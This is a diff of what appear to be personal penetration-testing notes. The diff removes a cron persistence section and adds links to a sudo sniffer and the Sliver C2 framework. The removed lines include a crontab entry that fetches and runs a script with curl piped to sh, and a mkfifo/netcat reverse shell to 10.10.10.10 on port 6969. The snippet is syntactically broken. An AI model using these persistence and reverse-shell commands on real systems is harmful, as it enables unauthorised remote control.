@@ -109,28 +109,6 @@ powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allo
 ```
 
 
-- Cron Persistence updating, fixing, trick research
-```bash
-
- crontab -e
-
-
-CT=$(crontab -l)
-CT=$CT('\n* * * * *   root    curl http://<ip>:<port>/run | sh')
-' /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 10.10.10.10 6969 >/tmp/f'
-
-printf "$CT" | cronbtab -
-```
-
-cron, setuid bash, alias
-
-nobody account has bash
-
-Systemd persistence
-https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8
-
-
-
 
 - Enabling RDP with cme and impacket kerboros tickets 
 	- Harden and or implement AMSI with powershell 
@@ -140,3 +118,9 @@ https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8
 - Get Sysinternals on box
 
 https://github.com/dubs3c/sudo_sniff/blob/master/sudo_sniff.c
+
+
+Alh4zr3d says sliver is better than empire 
+https://github.com/BishopFox/sliver
+
+https://github.com/0vercl0k - looks insane https://github.com/0vercl0k/clairvoyance
